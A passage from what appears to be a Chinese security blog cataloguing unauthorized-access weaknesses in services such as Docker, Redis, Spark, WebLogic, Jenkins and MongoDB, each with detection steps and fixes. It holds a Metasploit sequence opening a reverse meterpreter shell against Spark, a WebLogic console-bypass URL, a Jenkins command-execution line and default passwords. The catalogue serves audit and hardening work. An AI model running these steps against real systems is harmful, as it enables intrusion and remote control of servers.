是docker下的集群管理工具，在开放2375端口来监听集群容器时，会调用这个api，可以执行docker命令，root权限启动docker情况下可直接可以控制服务器</p><h2 id="漏洞检测-4"><a href="#漏洞检测-4" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接输入地址 <code>http://ip:2375/version</code>。若能访问，证明存在未授权访问漏洞</p><p>也可以使用-H参数远程执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 ps</span><br></pre></td></tr></table></figure><h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>对2375端口做网络访问控制，如ACL控制，或者访问规则；</li><li>修改docker swarm的认证方式，使用TLS认证；</li></ul><h1 id="5000-Docker-Registry未授权"><a href="#5000-Docker-Registry未授权" class="headerlink" title="[5000] Docker Registry未授权"></a>[5000] Docker Registry未授权</h1><h2 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>默认5000端口，docker remote api可以执行docker命令，该接口是目的是取代docker 命令界面，通过url操作docker。</p><h2 id="漏洞检测-5"><a href="#漏洞检测-5" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、<a href="http://10.101.20.43:5000/v2">http://10.101.20.43:5000/v2</a></p><p><a href="http://10.101.20.43:5000/v2/_catalog">http://10.101.20.43:5000/v2/_catalog</a></p><h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、设置ACL，只允许信任ip连接对应端口</p><p>2、开启TLS，使用生成的证书进行认证</p><h1 id="5601-Kibana-未授权访问"><a href="#5601-Kibana-未授权访问" class="headerlink" title="[5601] Kibana 未授权访问"></a>[5601] Kibana 未授权访问</h1><h2 id="漏洞简介-6"><a href="#漏洞简介-6" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露</p><h2 id="漏洞检测-6"><a href="#漏洞检测-6" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接访问kibana的页面</p><p><a href="http://192.168.126.130:5601/">http://192.168.126.130:5601/</a></p><p><a href="https://192.168.126.130/app/kibana#">https://192.168.126.130/app/kibana#</a></p><p><a href="http://192.168.126.130:5601/app/kibana#/">http://192.168.126.130:5601/app/kibana#/</a></p><p>无需账号密码可以登录进入界面</p><h2 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码；</li><li>设置防火墙策略，限定IP访问服务；</li></ul><h1 id="5900-x2F-5901-VNC-未授权访问"><a href="#5900-x2F-5901-VNC-未授权访问" class="headerlink" title="[5900&#x2F;5901] VNC 未授权访问"></a>[5900&#x2F;5901] VNC 未授权访问</h1><h2 id="漏洞简介-7"><a href="#漏洞简介-7" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。</p><p>VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。</p><h2 id="漏洞检测-7"><a href="#漏洞检测-7" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用 VNC 客户端连接主机</p><p>VNC-Viewer工具下载(<a href="https://www.realvnc.com/en/connect/download/viewer/windows/">https://www.realvnc.com/en/connect/download/viewer/windows/</a>)</p><p>安装过程，双击msi文件一路下一步就可以了。</p><p>在 VNC 客户端输入目标服务器IP，之后点击确定、连接，即可成功控制目标服务器</p><h2 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码；</li><li>以最小权限的普通用户身份运行操作系统；</li></ul><h1 id="5984-CouchDB-未授权访问"><a href="#5984-CouchDB-未授权访问" class="headerlink" title="[5984] CouchDB 未授权访问"></a>[5984] CouchDB 未授权访问</h1><h2 id="漏洞简介-8"><a href="#漏洞简介-8" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p><p>在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。</p><h2 id="漏洞检测-8"><a href="#漏洞检测-8" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、未授权访问kali测试命令</p><p>curl 192.168.126.130:5984</p><p>curl 192.168.126.130:5984&#x2F;_config</p><h2 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>指定CouchDB绑定的IP （需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。 注：修改后只有本机才能访问CouchDB。</p><p>设置访问密码（需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码。</p><p>设置WWW-Authenticate，强制认证。</p><h1 id="6066-x2F-8081-x2F-8082-Apache-Spark-未授权访问"><a href="#6066-x2F-8081-x2F-8082-Apache-Spark-未授权访问" class="headerlink" title="[6066&#x2F;8081&#x2F;8082] Apache Spark 未授权访问"></a>[6066&#x2F;8081&#x2F;8082] Apache Spark 未授权访问</h1><h2 id="漏洞简介-9"><a href="#漏洞简介-9" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p><h2 id="漏洞检测-9"><a href="#漏洞检测-9" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>nmap扫描出如下端口开放，则很有可能存在漏洞(6066,8081,8082)</p><p>使用msf工具getshell</p><p>msf5&gt;use exploit&#x2F;linux&#x2F;http&#x2F;spark_unauth_rce</p><p>msf5&gt;set payload java&#x2F;meterpreter&#x2F;reverse_tcp</p><p>msf5&gt;set rhost 192.168.100.2</p><p>msf5&gt;set rport 6066</p><p>msf5&gt;set lhost 192.168.100.1</p><p>msf5&gt;set lport 4444</p><p>msf5&gt;set srvhost 192.168.100.1</p><p>msf5&gt;set srvport 8080</p><p>msf5&gt;exploit</p><h2 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>对外关闭敏感端口；</li><li>配置用户权限认证；</li></ul><h1 id="6379-Redis-未授权访问"><a href="#6379-Redis-未授权访问" class="headerlink" title="[6379] Redis 未授权访问"></a>[6379] Redis 未授权访问</h1><h2 id="漏洞简介-10"><a href="#漏洞简介-10" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。</p><p>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p><h2 id="漏洞检测-10"><a href="#漏洞检测-10" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>端口扫描</p><p>Kali连接主机</p><p>（1）kali安装redis-cli远程连接工具</p><p>wget <a href="http://download.redis.io/redis-stable.tar.gz">http://download.redis.io/redis-stable.tar.gz</a></p><p>tar -zxvf redis-stable.tar.gz</p><p>cd redis-stable</p><p>make</p><p>cp src&#x2F;redis-cli &#x2F;usr&#x2F;bin&#x2F;</p><p>redis-cli -h</p><p>（2）使用redis-cli命令直接远程免密登录redis主机</p><p>redis-cli -h 目标主机IP</p><p>（3）尝试keys * 命令，若存在以下页面，则存在漏洞</p><p><img src="/img/1671593077890-9fdec5e4-09fc-4819-9125-6214c162cfe0.jpeg" alt="img"></p><p>（4）进一步利用</p><p>利用redis 可视化工具Another Redis Desktop Manager</p><h2 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>到redis安装目录下，配置redis.conf文件：</p><p>1、默认只对本地开放</p><p>bind 127.0.0.1</p><p>2、添加登陆密码</p><p>修改 redis.conf 文件，添加</p><p>requirepass  mypasswd</p><p>3、在需要对外开放的时候修改默认端口（端口不重复就可以）</p><p>port 2344</p><p>4、以低权限运行 Redis 服务（重启redis才能生效）</p><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><p>5、最后还可以配合iptables限制开放</p><h1 id="7001-Weblogic-未授权访问"><a href="#7001-Weblogic-未授权访问" class="headerlink" title="[7001] Weblogic 未授权访问"></a>[7001] Weblogic 未授权访问</h1><h2 id="漏洞简介-11"><a href="#漏洞简介-11" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。</p><p>CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><h2 id="漏洞检测-11"><a href="#漏洞检测-11" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用vulhub搭建漏洞演示环境</p><p>cd vulhub&#x2F;weblogic&#x2F;CVE-2020-14882</p><p>sudo docker-compose up –d</p><p>攻击者可以构造特殊请求的URL，即可未授权访问到管理后台页面：</p><p><a href="http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal">http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal</a></p><p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。</p><h2 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>下载补丁程序并安装更新；</li></ul><h1 id="8088-HadoopYARN-未授权访问"><a href="#8088-HadoopYARN-未授权访问" class="headerlink" title="[8088] HadoopYARN 未授权访问"></a>[8088] HadoopYARN 未授权访问</h1><h2 id="漏洞简介-12"><a href="#漏洞简介-12" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。</p><p>此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。</p><h2 id="漏洞检测-12"><a href="#漏洞检测-12" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用vulhub搭建漏洞演示环境</p><p>1 cd &#x2F;vulhub&#x2F;hadoop&#x2F;unauthorized-yarn</p><p>2 docker-compose up -d</p><p>3、环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。</p><p>1 <a href="http://192.168.126.130:8088/">http://192.168.126.130:8088/</a></p><p>2 <a href="http://192.168.126.130:8088/cluster">http://192.168.126.130:8088/cluster</a></p><p>利用该漏洞，可以进一步getshell</p><h2 id="漏洞修复-12"><a href="#漏洞修复-12" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>升级Hadoop到x版本以上，并启用Kerberos认证功能，禁止匿名访问;</li><li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口；</li><li>如无必要，关闭 Hadoop Web 管理页面；</li></ul><h1 id="8080-JBoss-未授权访问"><a href="#8080-JBoss-未授权访问" class="headerlink" title="[8080] JBoss 未授权访问"></a>[8080] JBoss 未授权访问</h1><h2 id="漏洞简介-13"><a href="#漏洞简介-13" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 <a href="http://ip:8080/jmx-console%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%B5%8F%E8%A7%88">http://ip:8080/jmx-console，就可以浏览</a> Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患</p><h2 id="漏洞检测-13"><a href="#漏洞检测-13" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接访问 <a href="http://ip:port/，看是否能进入">http://ip:port/，看是否能进入</a> jmx-console 和 web-console 页面</p><p><a href="http://ip:8080/">http://ip:8080/</a></p><p><a href="http://ip:8080/jmx-console/">http://ip:8080/jmx-console/</a></p><p><a href="http://ip:8080/jbossws/">http://ip:8080/jbossws/</a></p><h2 id="漏洞修复-13"><a href="#漏洞修复-13" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>添加 JMX 控制页面身份认证；</li><li>进行JMX Console 安全配置；</li><li>关闭jmx-console和web-console;</li></ul><h1 id="8080-Jenkins-未授权访问"><a href="#8080-Jenkins-未授权访问" class="headerlink" title="[8080] Jenkins 未授权访问"></a>[8080] Jenkins 未授权访问</h1><h2 id="漏洞简介-14"><a href="#漏洞简介-14" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p><h2 id="漏洞检测-14"><a href="#漏洞检测-14" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接通过url输入以下地址，若能访问，证明存在未授权访问漏洞。</p><p>http:&#x2F;&#x2F;<target>:8080&#x2F;manage</p><p>http:&#x2F;&#x2F;<target>:8080&#x2F;script</p><p>未授权访问 http:&#x2F;&#x2F;<target>:8080&#x2F;script，可以执行系统命令</p><p># 命令格式</p><p>println ‘whoami’.execute().text</p><h2 id="漏洞修复-14"><a href="#漏洞修复-14" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>对后台控制页面做登录验证限制；</li><li>升级Jenkins至新版本；</li><li>禁止把Jenkins直接暴露在公网；</li></ul><h1 id="8080-x2F-10250-Kubernetes-Api-Server-未授权"><a href="#8080-x2F-10250-Kubernetes-Api-Server-未授权" class="headerlink" title="[8080&#x2F;10250] Kubernetes Api Server 未授权"></a>[8080&#x2F;10250] Kubernetes Api Server 未授权</h1><h2 id="漏洞简介-15"><a href="#漏洞简介-15" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。</p><h2 id="漏洞检测-15"><a href="#漏洞检测-15" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p><p>2、检测</p><p>（1）端口：8080 <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p><p>（2）端口：8080：api dashboard：<a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a></p><p>（3）端口：10250端口是kubelet API的HTTPS端口，通过路径:<a href="https://xxx/10250/pods%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E3%80%81%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%E4%BF%A1%E6%81%AF%E3%80%81%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%AD%89%E4%BF%A1%E6%81%AF%E3%80%82">https://xxx/10250/pods获取环境变量、运行的容器信息、命名空间等信息。</a></p><h2 id="漏洞修复-15"><a href="#漏洞修复-15" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>进行授权认证；</li><li>使用Service Account令牌；</li><li>设置防火墙策略，限定IP访问服务；</li></ul><h1 id="8161-Active-MQ-未授权访问"><a href="#8161-Active-MQ-未授权访问" class="headerlink" title="[8161] Active MQ 未授权访问"></a>[8161] Active MQ 未授权访问</h1><h2 id="漏洞简介-16"><a href="#漏洞简介-16" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p><h2 id="漏洞检测-16"><a href="#漏洞检测-16" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>默认端口：8161</p><p>默认密码：admin&#x2F;admin</p><h2 id="漏洞修复-16"><a href="#漏洞修复-16" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对未授权访问，可修改conf&#x2F;jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true，重启服务即可。</p><p>针对弱口令，可修改conf&#x2F;jetty.xml文件，bean id 为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务即可。</p><h1 id="8888-Jupyter-Notebook-未授权访问"><a href="#8888-Jupyter-Notebook-未授权访问" class="headerlink" title="[8888] Jupyter Notebook 未授权访问"></a>[8888] Jupyter Notebook 未授权访问</h1><h2 id="漏洞简介-17"><a href="#漏洞简介-17" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p><h2 id="漏洞检测-17"><a href="#漏洞检测-17" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、使用vulhub搭建漏洞演示环境</p><p>cd &#x2F;vulhub&#x2F;jupyter&#x2F;notebook-rce</p><p>docker-compose up -d</p><p>2、端口扫描</p><p>3、访问<a href="http://your-ip:8888，将看到Jupyter">http://your-ip:8888，将看到Jupyter</a> Notebook的Web管理界面，并没有要求填写密码。</p><p>选择 new -&gt; terminal 即可创建一个控制台：</p><p>直接执行任意命令：</p><h2 id="漏洞修复-17"><a href="#漏洞修复-17" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>开启身份验证，防止未经授权用户访问；</li><li>访问控制策略，限制IP访问，绑定固定IP；</li></ul><h1 id="9200-x2F-9300-Elasticsearch-未授权访问（9200、9300）"><a href="#9200-x2F-9300-Elasticsearch-未授权访问（9200、9300）" class="headerlink" title="[9200&#x2F;9300] Elasticsearch 未授权访问（9200、9300）"></a>[9200&#x2F;9300] Elasticsearch 未授权访问（9200、9300）</h1><h2 id="漏洞简介-18"><a href="#漏洞简介-18" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。</p><h2 id="漏洞检测-18"><a href="#漏洞检测-18" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、浏览器访问测试命令</p><p><a href="http://localhost:9200/">http://localhost:9200</a></p><p><a href="http://localhost:9200/_cat/">http://localhost:9200/_cat/</a></p><p><a href="http://localhost:9200/_cat/indices">http://localhost:9200/_cat/indices</a></p><p><a href="http://localhost:9200/_river/_search">http://localhost:9200/_river/_search</a> &#x2F;&#x2F;查看数据库敏感信息</p><p><a href="http://localhost:9200/_nodes">http://localhost:9200/_nodes</a>         &#x2F;&#x2F;查看节点数据</p><p>如有安装head插件：</p><p><a href="http://localhost:9200/_plugin/head/">http://localhost:9200/_plugin/head/</a>  &#x2F;&#x2F;web管理界面</p><h2 id="漏洞修复-18"><a href="#漏洞修复-18" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>访问控制策略，限制IP访问，绑定固定IP；</li><li>在config&#x2F;elasticsearch.yml中为9200端口设置认证等；</li></ul><h1 id="10051-Zabbix-未授权访问"><a href="#10051-Zabbix-未授权访问" class="headerlink" title="[10051] Zabbix 未授权访问"></a>[10051] Zabbix 未授权访问</h1><h2 id="漏洞简介-19"><a href="#漏洞简介-19" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><h2 id="漏洞检测-19"><a href="#漏洞检测-19" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、无需账户密码直接访问zabbix页面</p><h2 id="漏洞修复-19"><a href="#漏洞修复-19" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>设置zabbix的复杂口令，不要用默认口令或弱口令，禁用guest登录功能；</li><li>zabbix的server和agent都不要以root启动，不要设置AllowRoot&#x3D;1；</li><li>禁止agent执行run，不要设置EnableRemoteCommands&#x3D;1；</li></ul><h1 id="11211-Memcached-未授权访问"><a href="#11211-Memcached-未授权访问" class="headerlink" title="[11211] Memcached 未授权访问"></a>[11211] Memcached 未授权访问</h1><h2 id="漏洞简介-20"><a href="#漏洞简介-20" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露。</p><h2 id="漏洞检测-20"><a href="#漏洞检测-20" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、无需用户名密码，可以直接连接memcache 服务的11211端口</p><p>telnet 10.10.4.89 11211</p><p># 或者</p><p>nc -vv 11211</p><p>使用了 stats 命令来输出 Memcached 服务信息</p><h2 id="漏洞修复-20"><a href="#漏洞修复-20" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>修改绑定的IP、端口和指定访问者IP；</li><li>设置防火墙策略；</li><li>禁止暴露在公网；</li><li>配置memcached监听本地回环地址</li><li>127.0.0.1；</li></ul><h1 id="15672-x2F-15692-x2F-25672-RabbitMQ-未授权访问"><a href="#15672-x2F-15692-x2F-25672-RabbitMQ-未授权访问" class="headerlink" title="[15672&#x2F;15692&#x2F;25672] RabbitMQ 未授权访问"></a>[15672&#x2F;15692&#x2F;25672] RabbitMQ 未授权访问</h1><h2 id="漏洞简介-21"><a href="#漏洞简介-21" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p><h2 id="漏洞检测-21"><a href="#漏洞检测-21" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、浏览器访问测试</p><p>默认账号密码都是guest</p><p><a href="http://10.10.4.89:15672/">http://10.10.4.89:15672</a></p><p><a href="http://10.10.4.89:15692/">http://10.10.4.89:15692</a></p><p><a href="http://10.10.4.89:25672/">http://10.10.4.89:25672</a></p><h2 id="漏洞修复-21"><a href="#漏洞修复-21" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>修改为强密码，删除默认的账号guest；</li><li>禁止对外网开放，仅限于内部访问；</li></ul><h1 id="27017-MongoDB-未授权访问"><a href="#27017-MongoDB-未授权访问" class="headerlink" title="[27017] MongoDB 未授权访问"></a>[27017] MongoDB 未授权访问</h1><h2 id="漏洞简介-22"><a href="#漏洞简介-22" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p><p>造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p><h2 id="漏洞检测-22"><a href="#漏洞检测-22" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、kali安装mongodb，然后直接连接到服务。</p><p>yum install mongodb</p><p>mongo –host 10.2.20.34 –port 27017</p><h2 id="漏洞修复-22"><a href="#漏洞修复-22" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>限制绑定IP，启动时加入参数–bind_ip 127.0.0.1或在&#x2F;etc&#x2F;mongodb.conf文件中添加以下内容：bind_ip &#x3D; 127.0.0.1；</li><li>在system.users中添加用户，启动认证；</li><li>设置防火墙策略，限定 IP 访问服务；</li><li>禁用HTTP和REST端口，修改配置文件或在启动的时候选择参数nohttpinterface&#x3D;false；</li></ul><h1 id="2049-x2F-20048-NFS-未授权访问"><a href="#2049-x2F-20048-NFS-未授权访问" class="headerlink" title="[2049&#x2F;20048] NFS 未授权访问"></a>[2049&#x2F;20048] NFS 未授权访问</h1><h2 id="漏洞简介-23"><a href="#漏洞简介-23" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏。</p><h2 id="漏洞检测-23"><a href="#漏洞检测-23" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、</p><p>#linux安装nfs客户端</p><p>apt install nfs-common</p><p>#查看nfs服务器上的共享目录</p><p>showmount -e 192.168.126.130</p><p>#挂载相应共享目录到本地</p><p>mount -t nfs 192.168.126.130:&#x2F;grdata &#x2F;mnt</p><p>#卸载目录</p><p>umount &#x2F;mnt</p><h2 id="漏洞修复-23"><a href="#漏洞修复-23" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>利用iptables限制端口2049和20048端口的访问，禁止外部访问；</li><li>设置&#x2F;etc&#x2F;exports，对访问进行控制；</li></ul><h1 id="28096-Dubbo-未授权访问"><a href="#28096-Dubbo-未授权访问" class="headerlink" title="[28096] Dubbo 未授权访问"></a>[28096] Dubbo 未授权访问</h1><h2 id="漏洞简介-24"><a href="#漏洞简介-24" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p><h2 id="漏洞检测-24"><a href="#漏洞检测-24" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、连接进入dubbo 服务，进行操作</p><p>telent IP port</p><h2 id="漏洞修复-24"><a href="#漏洞修复-24" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置dubbo认证；</li><li>设置防火墙策略，限定IP访问；</li></ul><h1 id="Druid-未授权访问"><a href="#Druid-未授权访问" class="headerlink" title="Druid 未授权访问"></a>Druid 未授权访问</h1><h2 id="漏洞简介-25"><a href="#漏洞简介-25" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。</p><h2 id="漏洞检测-25"><a href="#漏洞检测-25" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>直接在网站的url中后加上：</p><p>1 &#x2F;druid&#x2F;index.html</p><p>2 &#x2F;druid&#x2F;websession.html</p><p>3 &#x2F;druid&#x2F;datasource.html</p><p>4 &#x2F;druid&#x2F;sql.html</p><p>5 &#x2F;druid&#x2F;spring.html</p><p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p><h2 id="漏洞修复-25"><a href="#漏洞修复-25" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置访问账号密码；</li><li>禁止对外网开放访问；</li></ul><h1 id="Solr-未授权访问"><a href="#Solr-未授权访问" class="headerlink" title="Solr 未授权访问"></a>Solr 未授权访问</h1><h2 id="漏洞简介-26"><a href="#漏洞简介-26" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell。</p><h2 id="漏洞检测-26"><a href="#漏洞检测-26" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>敏感目录扫描时加上一条 &#x2F;solr&#x2F;admin</p><p><a href="http://xx.xx.com/solr/admin">http://xx.xx.com/solr/admin</a></p><p><a href="https://xx.xx.com/solr/admin">https://xx.xx.com/solr/admin</a></p><h2 id="漏洞修复-26"><a href="#漏洞修复-26" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置solr访问控制权限；</li><li>禁止将solr暴露在公网；</li></ul><h1 